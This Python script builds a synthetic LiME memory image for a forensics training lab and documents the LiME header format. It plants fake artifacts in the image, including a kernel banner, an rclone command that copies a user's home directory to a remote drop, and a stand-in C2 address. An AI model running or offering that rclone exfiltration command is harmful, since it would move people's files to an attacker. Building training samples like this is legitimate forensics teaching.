#!/usr/bin/env python3
"""mk_lime_sample.py - build a small, valid LiME-format memory image for the Day 26 labs.

Usage: python3 mk_lime_sample.py OUT

LiME and AVML write the **LiME format**: the physical memory is stored as a series of *System RAM
ranges*, each preceded by a fixed 32-byte header, so the capture keeps each range's real physical
address and the holes between ranges are simply absent (unlike a "padded"/raw image, which zero-fills
the gaps from address 0). The header is (little-endian, packed):

    uint32 magic = 0x4C694D45 ("EMiL")   uint32 version = 1
    uint64 s_addr   uint64 e_addr (last byte, inclusive)   uint8 reserved[8]

This builds a deterministic two-range image for a fictional Linux host from the WS-ALICE campaign,
with a gap between the ranges, a realistic kernel **banner** in the first range (the string Volatility
and dwarf2json key on to pick the matching symbols), and the C2 host in the second. It is NOT a real
Linux capture - there is no kernel to walk - so `banners` finds the banner but `linux.pslist` needs a
matching ISF (Day 26's point). Standard library only.
"""
import struct
import sys

MAGIC = 0x4C694D45
BANNER = (b"Linux version 6.8.0-ws-alice (gcc version 13.2.0) "
          b"#1 SMP PREEMPT_DYNAMIC Fri Oct 23 00:00:00 UTC 2026\x00")
# (s_addr, e_addr inclusive, {offset_in_range: bytes})
RANGES = [
    (0x1000, 0x4FFF, {0x100: BANNER,
                      0x800: b"init swapper/0 systemd rcu_sched\x00"}),
    (0x100000, 0x101FFF, {0x40: b"rclone --config /tmp/.rc/rc.conf copy /home/dana remote:drop\x00",
                          0x400: b"203.0.113.50\x00"}),
]


def main(out):
    blob = bytearray()
    for s_addr, e_addr, arts in RANGES:
        length = e_addr - s_addr + 1
        blob += struct.pack("<IIQQ8s", MAGIC, 1, s_addr, e_addr, b"\x00" * 8)
        body = bytearray(length)
        for off, data in arts.items():
            body[off:off + len(data)] = data
        blob += body
    with open(out, "wb") as f:
        f.write(blob)
    total = sum(e - s + 1 for s, e, _ in RANGES)
    print(f"wrote {out}: {len(blob)} bytes ({len(RANGES)} ranges, {total} bytes of System RAM + headers)")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(__doc__)
    main(sys.argv[1])
